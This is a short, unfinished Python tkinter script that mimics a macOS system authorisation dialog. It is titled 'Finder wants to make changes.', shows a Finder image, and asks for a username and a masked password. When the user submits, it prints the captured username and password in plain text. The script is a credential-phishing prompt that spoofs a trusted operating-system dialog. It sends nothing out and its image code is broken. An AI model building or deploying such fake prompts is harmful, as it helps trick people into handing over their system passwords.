
#for 3.6.4
from tkinter import *
import tkinter as tk
import os

class Window(Frame):
    def __init__(self, master=None):
        Frame.__init__(self, master)
        self.master = master
        self.grid()
        self.widgets()
        self.entry()
        self.master.title("Finder wants to make changes.")
        self.finderImg()

#Widgets and Entries
    def finderImg(self):
        #Image doesnt want to fucking show up.
        canvas = Canvas(self, width = 1000, height = 1000)
        canvas.grid(row=5, column=5)

        img = PhotoImage(file="./Images/finder.gif")
        canvas.create_image(25,23, file=img)

    def widgets(self):
        okayButton = Button(self, text="Okay", command=self.okay)
        okayButton.grid(row=5, column=2)

        cancelButton = Button(self, text="Cancel", command=self.exitButton)
        cancelButton.grid(row=5, column=1)

    def entry(self):
        L1 = Label(self, text="User Name: ")
        L1.grid(row=2, column=1)
        self.username = tk.Entry(self)
        self.username.grid(row=2, column=2)
        self.username.bind('<Return>', self.okay)

        L2 = Label(self, text="Password: ")
        L2.grid(row=3, column=1)
        bullet = "\u2022"
        self.password = tk.Entry(self)
        self.password.grid(row=3, column=2)
        self.password.config(show=bullet)
        self.password.bind('<Return>', self.okay)

#Button functions (works, but not with <Return> bind)
# tries idea not trashed, work on later
    def okay(self):
        #tries = 0
        user = self.username.get()
        password = self.password.get()
        if user == "" or password == "":
            print("No username or password entered.")
        else:
            print("User Name: " + user)
            print("Password: " + password)
            #tries = (tries + 1)
            #print(tries)

    def exitButton(self):
        print("~Exiting~")
        exit()

#Starts the program
def start():
    os.system("clear")
    print("~Waiting for input~")
    master = Tk()
    app = Window(master)
    master.mainloop()

start()
